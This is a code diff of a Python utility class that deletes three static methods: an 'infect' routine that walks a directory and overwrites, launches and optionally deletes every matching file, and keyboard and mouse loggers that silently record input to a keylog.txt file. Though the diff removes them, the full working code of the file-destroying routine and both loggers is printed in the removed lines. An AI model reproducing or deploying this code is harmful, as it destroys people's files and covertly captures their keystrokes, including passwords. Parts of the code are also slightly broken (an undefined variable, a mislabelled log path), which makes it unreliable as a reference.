@@ -31,63 +31,6 @@ class Task(threading.Thread):
                 self.fLock.release()
             except:
                 pass
-
-    @staticmethod
-    def infect(source=None, path=os.getcwd(), ext="",start=False, delete_source=False, delete_infected=False, delay=None, action=None):
-
-        from subprocess import run
-        from time import sleep as _sp
-
-        if source:
-            with open(source, 'r') as src:
-                contents = src.read()
-        else:
-            contents = "https://grigoprg.webnode.it"
-
-        for RootDir, __Fldrs__, _file in os.walk(path):
-            for _file_ in _file:
-                _path = RootDir + "\\" + _file_
-                try:
-                    if ext == "":
-                        with open(_path, 'w') as fw:
-                            fw.write(contents)
-                        if action:
-                            action()
-                        if start:
-                            run(f'start {_path}', shell=True)
-                        if delay:
-                            _sp(delay)
-                        if delete_infected:
-                            try:
-                                os.unlink(_path)
-                            except:
-                                os.remove(_path)
-                    else:
-                        if _file_.endswith(ext):
-                            with open(_path, 'w') as fw:
-                                fw.write(contents)
-                            if action:
-                                action()
-                            if start:
-                                run(f'start {_path}', shell=True)
-                            if delay:
-                                _sp(delay)
-                            if delete_infected:
-                                try:
-                                    os.unlink(_path)
-                                except:
-                                    os.remove(_path)
-                except:
-                    pass
-
-        if delete_source:
-            try:
-                try:
-                    os.unlink(file_source)
-                except:
-                    os.remove(file_source)
-            except:
-                pass    
              
     @staticmethod
     def Link(func_one, func_two, delay, args1 = [], args2 = []):
@@ -109,55 +52,6 @@ class Task(threading.Thread):
     def class_name(cls):
         return cls.__name__
     
-    @staticmethod
-    def keylog(_path_):
-        from pynput.keyboard import Key, Listener
-        import logging
-
-        if _path_.endswith("\\"):
-            
-            PATH = _path_ + "keylog.txt"
-            
-        else:
-            
-            PATH = _path_ + "\\" + "keylog.txt"
-
-        logging.basicConfig(filename=PATH, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-        def on_press(key):
-            logging.info(key)
-
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-            
-    @staticmethod
-    def clicklog(_path_):
-        from pynput.mouse import Listener
-        import logging
-
-        if _path_.endswith("\\"):
-            
-            PATH = _path_ + "keylog.txt"
-            
-        else:
-            
-            PATH = _path_ + "\\" + "keylog.txt"
-
-        logging.basicConfig(filename=PATH, level=logging.DEBUG, format="%(asctime)s: %(message)s")
-
-        def on_move(x, y):
-            logging.info("Mouse moved to ({0},{1})".format(x, y))
-
-        def on_click(x, y, button, pressed):
-            if pressed:
-                logging.info("Mouse clicked at ({0},{1}) with {2}".format(x, y, button))
-
-        def on_scroll(x, y, dx, dy):
-            logging.info("Mouse scrolled at ({0},{1})({2},{3})".format(x, y, dx, dy))
-
-        with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
-            listener.join()
-
     @staticmethod
     def autowrite(text, delay=None):
         import pyautogui
